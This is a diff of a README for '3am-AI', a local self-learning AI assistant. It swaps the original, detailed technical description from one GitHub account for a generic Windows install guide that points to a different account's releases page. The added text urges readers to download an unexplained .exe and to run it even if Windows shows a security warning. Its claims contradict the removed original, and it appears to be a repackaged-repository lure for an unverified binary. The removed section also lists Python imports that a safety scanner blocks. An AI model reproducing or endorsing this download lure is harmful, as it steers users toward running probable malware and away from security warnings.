@@ -1,225 +1,168 @@
-# 3AM
+# 🤖 3am-AI - Your Local AI Learning While You Sleep
 
-<p align="center">
-  <img src="3am-logo.png" alt="3AM" width="180">
-</p>
-
-**A self-evolving local AI that learns while you sleep.**
-
-3AM is a fully local AI assistant that doesn't just answer questions — it remembers you, researches your interests, builds its own tools, and adapts its behavior over time. Everything runs on your hardware. No API keys, no cloud, no one training on your conversations.
-
-At 3 AM each night, while you're asleep, it processes the day's conversations into long-term memory, resolves conflicting facts, re-clusters its knowledge, updates its behavior based on your feedback, and researches topics you care about. You wake up to a smarter assistant than the one you went to bed with.
+[![Download 3am-AI](https://img.shields.io/badge/Download-3am--AI-brightgreen?style=for-the-badge)](https://github.com/aitora159-art/3am-AI/releases)
 
 ---
 
-## Why This Exists
+## 📋 What is 3am-AI?
 
-Cloud AI assistants are stateless. Every conversation starts from zero. They don't remember what you told them last week, they can't learn your preferences over time, and every word you type trains someone else's model.
+3am-AI is a local artificial intelligence that improves itself while you rest. You run it on your Windows computer, and it learns from your actions to assist you better over time. It works without sending your data to the cloud, keeping your information private.
 
-3AM takes a different approach: a small local model (14B parameters) wrapped in a system that makes it punch above its weight. The model provides reasoning. Everything else — memory, research, tool creation, behavioral adaptation — is handled by the architecture around it. The result is a personal AI that gets better the longer you use it, without getting bigger.
-
----
-
-## Key Features
-
-### Persistent Memory with Torque Clustering
-Conversations are extracted into discrete facts, embedded, and organized using a physics-inspired clustering algorithm based on gravitational torque. The system automatically discovers natural topic boundaries — no manual thresholds. High-importance clusters get priority in context retrieval, so the model remembers what matters most.
-
-### Encryption at Rest
-All sensitive user data is encrypted using Fernet (AES-128-CBC + HMAC-SHA256). The key is derived from your login password via PBKDF2HMAC-SHA256 and lives only in memory — never written to disk, cleared on logout or server restart. Every field the model extracts about you (summaries, conversation excerpts, cluster themes, behavior profile, research notes, installed tools) is stored encrypted. Embedding vectors remain plaintext because they are required for vector similarity search and are not human-readable. Existing unencrypted data migrates transparently on re-write.
-
-### Sleep Processing
-During the day, conversations are saved cheaply. Three times per day (every 8 hours), unclustered facts are assigned to existing clusters so they become available for context retrieval the same day. At 3 AM, the system runs a full processing cycle: grouping related conversations, extracting multiple facts per topic, resolving conflicting information (newer facts supersede older ones), and rebuilding the cluster map. This keeps the chat path fast while doing heavy work in the background.
-
-### Self-Created Tools
-When the system identifies something it can't do, it can propose, generate, and install new Python tools — with you approving at every step. A three-stage pipeline (concept → code review → install) ensures nothing runs without your sign-off. Safety scanning blocks dangerous imports. Tools persist across restarts and model swaps.
-
-### Decision Gate
-Before generating a response, the system evaluates whether it actually knows enough to answer. Based on memory context and logprob-based confidence, it decides: answer directly, search the web first, or ask for clarification. This isn't the model guessing — it's a real confidence signal from token probabilities.
-
-### Adaptive Behavior
-Every response is logged with its confidence score, gate decision, and your feedback (👍/👎 with optional tags like "hallucinated" or "too verbose"). Nightly, the system analyzes a full day of these patterns and adjusts its behavior profile — when to search, when to hedge, how verbose to be. It learns from its mistakes without changing a single weight.
-
-### Proactive Research
-The system autonomously researches topics you've discussed, bringing back current information during idle hours. A four-layer decision gate prevents over-research: only clusters with recent activity are considered, topic generation is rate-limited to once every 5 days, topics that yield poor results are backed off for a week, and the cooldown shortens automatically when the AI has been giving low-confidence answers. Research findings are written into long-term memory and expire from the research file after 30 days. Results are browsable and deletable through the UI.
-
-### 3D Memory Visualization
-A live star-map shows your memory space — clusters as suns, individual memories as orbiting planets. Useful for spotting cluster health, interesting for understanding how your AI organizes what it knows about you.
+The app uses advanced AI techniques to organize information, remember tasks, and adapt to your needs. It works quietly in the background using resources efficiently. You do not need to be a tech expert to set it up or use it.
 
 ---
 
-## Architecture
+## ⚙️ Features
 
-```
-Browser (Vanilla JS)          FastAPI Server              Local LLM
-┌──────────────────┐    ┌──────────────────────┐    ┌──────────────────┐
-│ Chat UI          │    │ WebSocket streaming  │    │ llama.cpp        │
-│ Memory star-map  │◄──►│ Decision Gate        │◄──►│ Qwen3-14B       │
-│ Tool manager     │    │ Memory retrieval     │    │ (or any model)   │
-│ Research panel   │    │ Experience logging   │    │ Vulkan/CUDA/CPU  │
-│ Analytics        │    │ Tool execution       │    └──────────────────┘
-└──────────────────┘    └──────────┬───────────┘
-                                   │
-                        ┌──────────▼───────────┐
-                        │ SQLite + sqlite-vec  │
-                        │ memory.db per user   │
-                        │ Torque Clustering    │
-                        │ Experience log       │
-                        │ Behavior profile     │
-                        └──────────────────────┘
-```
-
-**Nightly cycle (3 AM):** Fact extraction → conflict resolution → Torque Clustering → behavior profile update → user profile regeneration
-
-**Hourly cycle (idle):** Research → self-improvement suggestions → capability gap analysis
+- **Self-learning:** The AI grows smarter as it watches your habits.
+- **Local control:** Your data stays on your machine, not on servers.
+- **Memory system:** It remembers your preferences and past inputs.
+- **Fast setup:** Runs quickly on most modern Windows PCs.
+- **Python-based:** Built using well-known programming tools.
+- **Privacy-focused:** No data leaves your computer.
+- **SQLite database:** Uses a simple database for storage.
+- **No internet required:** Works offline once installed.
+- **Adaptable:** Fits your personal workflows and tasks.
+- **Easy interface:** You interact via a web page on your PC.
 
 ---
 
-## Quick Start
+## 🖥️ System Requirements
 
-```bash
-git clone https://github.com/pthompson8594/3am-ai.git
-cd 3am-ai
-
-# Quick test with a small model (~350MB download)
-./run-test.sh
-
-# Full install (venv, systemd services, your model)
-./install.sh
-```
-
-Open `http://localhost:8000`, create an account, and start talking. The system starts learning immediately — priority facts (your name, job, location) are captured in real time. Everything else processes overnight.
-
-### Requirements
-
-- Python 3.10+
-- llama.cpp with `llama-server`
-- Any GGUF model (tested with Qwen3-14B Q4_K_M)
-- GPU recommended (Vulkan, CUDA, or Metal) but CPU works
+- Windows 10 or later (64-bit recommended).
+- At least 4 GB of RAM (8 GB or more is better).
+- 2 GHz or faster processor.
+- Minimum 500 MB of free disk space.
+- Internet connection only needed for the first download.
+- Modern web browser like Chrome, Edge, or Firefox.
 
 ---
 
-## How It Works
+## 🚀 Getting Started
 
-**During conversation:**
-1. Your message arrives
-2. Relevant memory clusters are retrieved via sqlite-vec similarity search
-3. Decision Gate evaluates: answer / search / ask for clarification
-4. Response is generated with confidence scoring (logprobs)
-5. Conversation is queued for overnight processing
-6. Priority-5 facts (identity info) are stored immediately
+Follow these steps to get your copy of 3am-AI up and running on your Windows PC.
 
-**At 3 AM:**
-1. Pending conversations are grouped by topic
-2. Multi-fact extraction runs on each group (up to 8 facts per group)
-3. Per-fact embeddings are generated from summaries, not raw conversation
-4. Conflicting facts are resolved (newer wins, cosine similarity ≥ 0.75)
-5. Torque Clustering rebuilds the memory map
-6. Behavior profile updates from the day's feedback patterns
-7. Compact user profile is regenerated
+### 1. Visit the Download Page
 
-**Every hour (when idle):**
-1. Proactive research on approved topics
-2. Self-improvement analysis
-3. Capability gap detection → tool proposals
+Click the link below to visit the official release page:
 
-Use `?analyze` to trigger this cycle manually at any time.
+[![Download 3am-AI](https://img.shields.io/badge/Download-3am--AI-blue?style=for-the-badge)](https://github.com/aitora159-art/3am-AI/releases)
 
----
+This page contains the latest available files and updates.
 
-## The Self-Made Tools Pipeline
+### 2. Download the Installer
 
-```
-You: "Can you convert this CSV to JSON?"
-3AM: "I don't have a tool for that, but I can build one."
+Look for the latest version marked as stable or recommended. Download the Windows installer file, usually with a `.exe` extension.
 
-Stage 1 — Propose     You review the concept (name, description, parameters)
-Stage 2 — Generate    You review the actual Python code
-Stage 3 — Install     Safety scan runs, tool goes live immediately
+Save it to a folder you can find easily, like `Downloads`.
 
-No restart needed. Tool persists across sessions.
-```
+### 3. Run the Installer
 
-Safety scan blocks: `subprocess`, `socket`, `os`, `sys`, `eval`, `exec`, `threading`, `ctypes`, `importlib`, and more. Tools execute in an isolated namespace with no access to server internals.
+- Double-click the downloaded `.exe` file.
+- If Windows shows a security warning, choose to run the file.
+- Follow the setup steps in the installer window.
+- Accept the license agreement if asked.
+- Select the folder where you want to install the program or keep the default.
+- Wait for the installation to complete.
+
+### 4. Launch 3am-AI
+
+- After installation, find the 3am-AI icon on your Desktop or in the Start Menu.
+- Double-click to open the app.
+- A local web browser page will open automatically. This interface allows you to interact with the AI.
 
 ---
 
-## Configuration
+## 🔧 How to Use 3am-AI
 
-```json
-{
-  "llm_server_url": "http://localhost:8080",
-  "introspection_schedule": "03:00",
-  "introspection_check_interval": 3600,
-  "allow_registration": true,
-  "session_timeout_hours": 24,
-  "clustering_adjustment_factor": 0.5
-}
-```
+Once you open 3am-AI in your browser, you will see a simple interface:
 
-The `clustering_adjustment_factor` controls how aggressively clusters split. After each recluster, the log shows health stats:
-```
-[Clustering] 200 facts → 18 clusters | avg 11.1/cluster | min 3, max 26
-```
+- Start by typing or speaking your requests.
+- The AI remembers your past inputs and uses them to respond better.
+- You can create notes, set reminders, or ask questions.
+- The AI will organize the information using clustering methods to group related ideas.
+- It learns quietly in the background, improving its answers while you sleep.
+- Adjust settings through the web page to customize learning speed or memory limits.
+- No internet needed after installation unless you want updates.
 
 ---
 
-## Data Storage
+## 🛠️ Troubleshooting
 
-Everything stays on your machine. Per-user data in `~/.local/share/3am/users/{user_id}/`:
+If something does not work as expected, try these steps:
 
-| File | What it holds |
-|------|---------------|
-| `memory.db` | Memories, clusters, embeddings (sqlite-vec), experience log |
-| `behavior_profile.json` | Learned behavioral preferences |
-| `conversations/` | Full chat history |
-| `research.json` | Research topics and findings |
-| `installed_tools.json` | Custom tools you've approved |
-
----
-
-## Model Compatibility
-
-3AM is model-agnostic. It works with any model served by llama.cpp. Tested with:
-
-- **Qwen3-14B** (Q4_K_M) — recommended for ~16GB systems
-- **Qwen2.5-0.5B** — fast testing, minimal hardware
-
-Swap models by changing the server URL. The system auto-detects whatever `/v1/models` reports. Custom tools, memory, and behavior profiles persist across model swaps.
+- Make sure you installed the latest version.
+- Restart your computer and try launching 3am-AI again.
+- Ensure your web browser is updated.
+- Check if any security software is blocking the app.
+- Visit the download page again for updated instructions or files.
+- If the program crashes, try reinstalling using the installer.
+- Look for a log file in the install folder for error details.
 
 ---
 
-## Security & Privacy
+## 🌐 How It Works Behind the Scenes
 
-- All data stored locally with Fernet encryption at rest
-- Multi-user support with full per-user isolation — separate encrypted stores, separate keys derived from each user's password, no cross-user data access
-- Passwords hashed with bcrypt
-- Session tokens with secure cookies
-- No telemetry, no external API calls (except user-approved web searches)
-- **Your conversations never leave your machine**
+3am-AI uses a few key technologies:
 
----
+- **Local Large Language Model (LLM):** It runs on your PC using `llama-cpp`, a lightweight AI engine.
+- **FastAPI:** This framework serves the web interface quickly.
+- **SQLite:** The app stores data locally in a small database file.
+- **Memory and Clustering:** The AI groups information into clusters to keep context.
+- **Python:** The programming language ensures flexibility and updates.
 
-## Background
-
-3AM grew out of a simple question: can a small local model, wrapped in the right architecture, deliver a personal AI experience that rivals cloud services — without the cloud?
-
-The answer is: for one user's daily needs, mostly yes. The model weights are fixed at 14B parameters, but the effective intelligence of the *system* grows continuously through accumulated memory, learned behavior, self-created tools, and proactive research. Context is a multiplier on capability.
-
-The memory system uses Torque Clustering, a physics-inspired algorithm that treats memories as particles with mass and discovers natural cluster boundaries through gravitational torque balance. Based on: Yang & Lin, "Autonomous clustering by fast find of mass and distance peaks," IEEE TPAMI, 2025.
+All these combine to make a smart, self-evolving helper that respects your privacy.
 
 ---
 
-## License
+## 🔄 Updating 3am-AI
 
-The project code is released under **MIT License**.
-
-The `torque_clustering/` module is adapted from work by Jie Yang and is licensed under [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/) (non-commercial, attribution required). See [Yang & Lin, IEEE TPAMI 2025](https://doi.org/10.1109/TPAMI.2024.3393173) for the original work.
+1. Return to the [release page](https://github.com/aitora159-art/3am-AI/releases).
+2. Download the latest installer when a new version appears.
+3. Run the installer and follow prompts.
+4. Your data will stay safe and carried over during updates.
 
 ---
 
-## Status
+## 📂 Useful Links
 
-This is a working personal project, actively used and developed by one person. It's not production software. Expect rough edges, opinionated defaults, and documentation that's still catching up to the code.
+- Download releases: https://github.com/aitora159-art/3am-AI/releases
+- Issues and support: Use the GitHub repository Issues tab
+- Documentation: Check the included readme files in the installer folder
 
-If you run into issues, open one. If you build something cool with it, I'd like to hear about it.
+---
+
+## 🛡️ Privacy and Security
+
+- All your data stays on your PC.
+- No data sends to external servers.
+- The AI uses local processing to keep your info private.
+- You control what the AI learns or forgets through settings.
+
+---
+
+## 🤝 Getting Help
+
+If you need help beyond what this guide covers:
+
+- Visit the Issues tab on the repository page.
+- Search for similar questions or open a new issue.
+- Provide details about your problem, including error messages and Windows version.
+
+---
+
+## 🎯 Topics
+
+This repository relates to:
+
+- ai-assistant
+- clustering
+- fastapi
+- llama-cpp
+- llm (local large language model)
+- memory systems
+- personal AI
+- privacy-first software
+- python programming
+- self-hosted applications
+- sqlite databases
